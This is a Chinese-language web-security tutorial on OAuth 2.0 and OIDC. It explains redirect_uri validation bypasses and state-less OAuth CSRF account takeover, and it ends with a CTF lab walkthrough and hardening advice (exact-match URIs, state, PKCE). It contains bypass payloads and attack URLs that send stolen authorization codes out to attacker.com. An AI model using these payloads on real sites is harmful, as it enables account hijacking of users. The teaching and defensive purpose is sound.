---
date: 2026-10-15
title: "OAuth 2.0与OIDC授权认证机制漏洞与Token劫持"
---
# 🔑 OAuth 2.0 与 OIDC 授权认证机制底层架构：`redirect_uri` 校验穿透与 `state` 缺陷账号劫持实战

> **学习指南**：在现代互联网中，几乎所有的“使用微信/QQ/Google/GitHub 账号一键登录”功能，背后都是由 **OAuth 2.0 框架** 与 **OIDC（OpenID Connect）协议** 驱动的。
> 很多初学者觉得 OAuth 的交互流程特别绕：又是 Code，又是 Token，又是重定向。
> 本篇笔记先用最形象的“酒店临时房卡”比喻理顺正常业务逻辑，然后层层拆解攻击者如何利用一个微小的 `redirect_uri` 校验疏漏或缺失的 `state` 参数，**在不破解密码的情况下，神不知鬼不觉接管目标受害者的全站账号！**

---


> [!NOTE] 模块前置语言与工具清单
> - **前置通关必备**：零基础读者强烈建议先通读全局导航 **[[01-零基础入门前置指南与黑话工具字典]]**，掌握安全法律红线、终端命令行、HTTP 报文骨架与黑话字典！
> - **环境依赖**：具备基础 Web 浏览器（Chrome/Firefox）抓包认知或轻量 Python 脚本执行能力。

## 一、小白零基础扫盲：什么是 OAuth 2.0 与 OIDC？

### 1. 通俗比喻：千万不要把家门钥匙给保洁阿姨（密码 vs 临时门卡）

* **传统蛮力做法（直接给账号密码，极度危险）**：
  * 假设你注册了一个叫“图片冲印助手”的第三方网站，它想读取你 GitHub 里的私人照片。
  * 传统的笨方法：你在“图片冲印助手”里直接输入你的 GitHub 账号和密码——这是安全大忌！因为第三方网站可以拿着你的密码删库、改资料，甚至把密码泄露给黑客。
* **OAuth 2.0 的优雅解法（发一张限时、限权的临时房卡）**：
  * 你点击“GitHub 授权登录”；
  * 页面跳转到 GitHub 官方网站，你输入密码确认；
  * GitHub 问你：“你允许图片冲印助手读取你的公开资料吗？”
  * 你点击“同意”后，GitHub 发给第三方网站一张 **Access Token（访问令牌）**。
  * 这张 Token 只能用来“读照片”，有效期只有 2 小时，且随时可以在 GitHub 个人中心一键吊销！

```mermaid
flowchart TD
    User["1. 资源所有者 (用户/你)"]
    Client["2. 客户端应用 (第三方网站/论坛)"]
    AuthServer["3. 授权服务器 (GitHub/Google 官方认证中心)"]
    ResourceServer["4. 资源服务器 (存放头像与资料的 API)"]

    User -->|"点击第三方网站上的 'GitHub 登录'"| Client
    Client -->|"302 重定向受害者到认证中心"| AuthServer
    AuthServer -->|"用户输入密码并点击'同意授权'"| User
    AuthServer -->|"下发临时兑奖凭证 (Authorization Code)"| Client
    Client -->|"凭 Code 向后台兑换真正的 Access Token"| AuthServer
    Client -->|"携带 Access Token 拉取受害者资料并完成登录"| ResourceServer
```

---

### 2. 必须厘清的核心概念：OAuth 2.0 与 OIDC 的根本区别

初学者常常把这两个词混为一谈，必须建立精准界定：
* **OAuth 2.0 负责“授权”（Authorization）——决定“你能干什么”**：
  它只关心发出的令牌有什么权限（Scope），它**并不负责证明你是谁**。
* **OIDC（OpenID Connect）负责“身份认证”（Authentication）——证明“你是谁”**：
  OIDC 是建立在 OAuth 2.0 顶层的一套轻量级身份认证协议。它在 OAuth 原本返回的 Access Token 基础上，额外增加了一个由授权服务器用私钥签发好的 **`id_token`（标准的 JWT 格式）**，里面明确记录了 `sub`（用户唯一ID）、`name` 等身份信息。

---

## 二、标准授权码模式（Authorization Code Grant）全流程时序

在所有授权模式中，**授权码模式是安全性最高、工业界应用最广的模式**。

```mermaid
sequenceDiagram
    autonumber
    participant Browser as 用户浏览器
    participant Client as 第三方网站 (client.com)
    participant OAuthServer as 授权服务器 (oauth.target.com)

    Browser->>Client: 1. 点击 "社交登录"
    Client-->>Browser: 2. 302 重定向到授权端点:<br/>/authorize?client_id=123&redirect_uri=https://client.com/callback&response_type=code&state=xyz123
    
    Browser->>OAuthServer: 3. 请求授权页面并登录账号
    OAuthServer-->>Browser: 4. 授权成功，302 跳回客户端，携带 Authorization Code:<br/>https://client.com/callback?code=AUTH_CODE_888&state=xyz123

    Browser->>Client: 5. 浏览器访问回调地址，将 code 与 state 提交给客户端
    Note over Client: 客户端严格校验 state 是否与初始生成一致!

    Client->>OAuthServer: 6. 客户端在【后端服务间通信】发送 POST /token:<br/>携带 code + client_secret
    OAuthServer-->>Client: 7. 校验无误，返回最终的 Access Token
    Client-->>Browser: 8. 客户端为用户建立登录会话 (Set-Cookie)
```

---

## 三、OAuth 2.0 核心攻击面一：`redirect_uri` 校验穿透导致 Code 被盗

### 1. 漏洞成因：未严格校验回调 URL 白名单
* **工作机制**：当用户同意授权后，授权服务器会把至关重要的 `code` 拼接到客户端在参数中指定的 `redirect_uri` 后面，通过 302 重定向送出。
* **致命缺陷**：如果授权服务器的校验逻辑写得极其粗糙（比如只判断域名是否以 `client.com` 开头，或者使用了错误的正则表达式）：
  攻击者只需篡改请求中的 `redirect_uri` 参数，**授权服务器就会把受害者的登录 Code 直接重定向发送到黑客的服务器上！**

---

### 2. 实战常见 4 大绕过技巧矩阵

| 脆弱校验逻辑 | 攻击者篡改的 `redirect_uri` Payload | 底层绕过机理 |
| :--- | :--- | :--- |
| **只检查子域名** | `https://client.com.attacker.com/callback` | 正则只检查了是否以 `https://client.com` 开头，实际解析出的主机是攻击者的域名 |
| **未拦截路径穿越** | `https://client.com/callback/../../open_redirect?url=http://attacker.com` | 结合客户端网站上存在的一个开放重定向漏洞（Open Redirect），链式将参数带跑 |
| **参数污染 / 截断** | `https://client.com/callback%23@attacker.com` 或 `%26` | 利用 URL 的 Fragment（`#`）或编码歧义，欺骗服务端解析器 |
| **弱域名后缀匹配** | `https://not-client.com` 或 `https://client.com@attacker.com` | 利用 HTTP UserInfo 语法将合法域名变为用户名 |

> [!NOTE] 💡 小白扫盲：逐个拆解上述 4 种高阶 URL 绕过黑魔法
> 1. **什么是 `../../` 路径穿越？**
>    * 在 URL 路径中，`..` 同样代表“上一级目录”。
>    * 很多 OAuth 服务器只检查 URL 前缀是否是 `https://client.com/callback`。当攻击者传入 `/callback/../../open_redirect` 时，前缀检查以为是合法的 `client.com` 从而放行；
>    * 但受害者浏览器收到 302 跳转时，会自动规范化路径，连续两个 `..` 回退到了网站根目录下的 `/open_redirect` 接口（开放重定向接口：即该页面会无脑跳转到参数 `?url=` 指定的黑客网站），最终把包含敏感 `?code=xxx` 的凭据整个送入黑客囊中！
> 2. **什么是 `@` 符号欺骗（HTTP UserInfo 语法）？**
>    * 在国际标准 RFC 3986 中，URL 的完整格式允许写成：`https://用户名:密码@真实域名/`（例如 `ftp://admin:123456@ftp.com/`）。
>    * 在 `@` 符号出现时，**浏览器与底层网络库会将 `@` 前面的所有内容当成‘用户名和账号’，而把 `@` 后面紧跟的内容当作真正的‘目标访问服务器’**！
>    * 当攻击者构造 `https://client.com@attacker.com` 时，表面上看起来有 `client.com`，但浏览器实际上连接的是黑客的 **`attacker.com`**，`client.com` 仅仅被当作了一个无辜的用户名！
> 3. **什么是 `%23`（井号 `#` 的 URL 编码）？**
>    * 在浏览器标准中，`#` 是 URL 锚点（Fragment，指向页面中的某个标题）。`#` 后面的所有参数浏览器都**绝不会发送给 Web 服务器**！
>    * 攻击者利用 `%23` 在不同解析库（前端、代理中间件、后端）中的解码先后时机差异，成功切断或拼接恶意参数。

---

### 3. 利用流程：一键窃取管理员 Authorization Code
1. 攻击者生成带有恶意 `redirect_uri` 的授权链接：
   ```http
   https://oauth.target.com/authorize?client_id=web_app&redirect_uri=https://attacker.com/steal&response_type=code
   ```
2. 诱导管理员受害者点击该链接；
3. 管理员此前已经在该系统登录，授权中心自动放行，页面 302 重定向到：
   `https://attacker.com/steal?code=ADMIN_SECRET_CODE_999`；
4. 攻击者的服务器日志直接捕获到该 `code`；
5. 攻击者拿着这个 Code，冒充管理员访问客户端正规回调接口，直接登录进入管理员后台！

---

## 四、OAuth 2.0 核心攻击面二：缺失 `state` 参数导致的 OAuth CSRF（账号绑定劫持）

这是许多知名应用（如各大企业邮箱、云平台控制台）频频中招的高级业务逻辑漏洞！

### 1. `state` 参数的本质：OAuth 体系的 Anti-CSRF Token
* 客户端在发起授权请求时，应当生成一个高熵随机字符串（例如 `state=3f7a1c9e...`）保存在用户的 Session 中；
* 当授权服务器带着 `code` 跳回客户端时，必须原封不动把这个 `state` 带回来；
* 客户端比对两边的 `state` 是否一致。如果不一致，说明本次登录请求被篡改！

---

### 2. 账号绑定劫持（Account Takeover）攻击链四步法

如果客户端系统**没有校验 `state` 参数**（或者甚至压根没传 `state`）：

```mermaid
sequenceDiagram
    autonumber
    participant Attacker as 攻击者
    participant Victim as 受害者用户
    participant Client as 目标业务网站 (client.com)
    participant OAuthServer as 第三方登录平台 (如 GitHub)

    Attacker->>OAuthServer: 1. 攻击者自己发起 OAuth 绑定，使用自己的 GitHub 账号
    OAuthServer-->>Attacker: 2. 授权平台下发回调: client.com/bind?code=ATTACKER_CODE
    Note over Attacker: 攻击者抓包拦截该请求，自己不要去访问它！

    Attacker->>Victim: 3. 攻击者将带有 ATTACKER_CODE 的链接诱导受害者点击
    Victim->>Client: 4. 受害者浏览器访问: client.com/bind?code=ATTACKER_CODE
    Note over Client: 客户端未校验 state，误以为是受害者发起的绑定！<br/>将攻击者的 GitHub 账号绑定到了受害者的业务账户上！

    Attacker->>Client: 5. 💥 攻击者直接在登录页点击 "GitHub 快捷登录"
    Client-->>Attacker: 6. 成功直接登入受害者的账号，完成全面接管！
```

---

## 五、CTF 实战靶场案例复现（组合拳劫持管理员账户）

### 靶场情境：受保护的企业内网 SSO 单点登录系统

* 业务架构：企业主站 `http://portal.ctf:8080/` 支持使用内网 OAuth 服务 `http://sso.ctf:8080/` 登录。
* 漏洞排查：
  1. 审计登录发包：主站没有携带 `state` 参数！
  2. 审计 `redirect_uri` 检查逻辑：允许注册子路径，且主站存在一个通用的文章跳转接口 `http://portal.ctf:8080/redirect?url=...`（典型的开放重定向）。

### 1. 构造链式攻击 URL
攻击者将开放重定向作为跳板，拼接入 OAuth 授权请求中：

```text
http://sso.ctf:8080/authorize?client_id=portal_app&response_type=code&redirect_uri=http://portal.ctf:8080/redirect?url=http://attacker.com/log
```

### 2. 攻击者服务器日志捕获 Code
将上述链接投递给管理员 Bot 访问。
管理员点击后，SSO 授权中心认为 `redirect_uri` 是以 `http://portal.ctf:8080/` 开头，予以放行；
随后页面跳转至 `http://portal.ctf:8080/redirect?url=...`，触发二次跳转，将带有 `code` 的完整参数全量外带给攻击者 VPS：

```http
GET /log?code=c8f1e29d0384 HTTP/1.1
Host: attacker.com
User-Agent: Mozilla/5.0
```

### 3. 兑换凭据并夺旗
攻击者使用该 Code 完成与主站的换票登录：
```http
GET /callback?code=c8f1e29d0384 HTTP/1.1
Host: portal.ctf:8080
```
主站返回设置管理员特权 Cookie：`Set-Cookie: session=admin_super_session_flag_pwned`！进入管理中心读取最终 Flag：
`flag{0auth2_r3d1r3ct_ur1_byp4ss_4cc0unt_t4k30v3r}`！

---

## 六、安全加固规范与最佳实践

1. **`redirect_uri` 强制采用全路径精确匹配（Exact Match）**：
   在授权服务端的后台管理中，要求客户端预先登记绝对完整的回调地址（如 `https://client.com/auth/callback`）。在收到授权请求时，必须使用**全字符串强等号对比**，严禁用通配符（`*`）或模糊正则。
2. **强制使用密码学强随机 `state` 参数**：
   客户端每次发起登录请求时，必须生成不可预测的随机哈希，存入受害者的 Session 或 HttpOnly Cookie；回调到达时严格比对，一旦发现缺失或不匹配，立即拒绝绑定与登录。
3. **推行 PKCE（Proof Key for Code Exchange，RFC 7636）扩展**：
   客户端在发起请求前生成随机验证串 `code_verifier`，计算其哈希 `code_challenge` 发送给授权中心；换取 Token 时必须出示明文 `code_verifier`。即使 Code 在传输过程中被黑客截获，因黑客没有对应的原始密钥，也无法换出任何 Token！

---

## 🔗 相关双向链接
- 上级模块：[[11-现代新型API与认证安全]]
- 前置实时协议：[[02-WebSocket协议握手机制与跨站劫持(CSWSH)攻防]]
- 下一模块：[[12-云原生与容器逃逸安全/01-Linux容器底层基础：Namespace隔离、Cgroups限制与容器环境识别]]
- 知识地图：[[00-Web安全与CTF知识地图总览]]
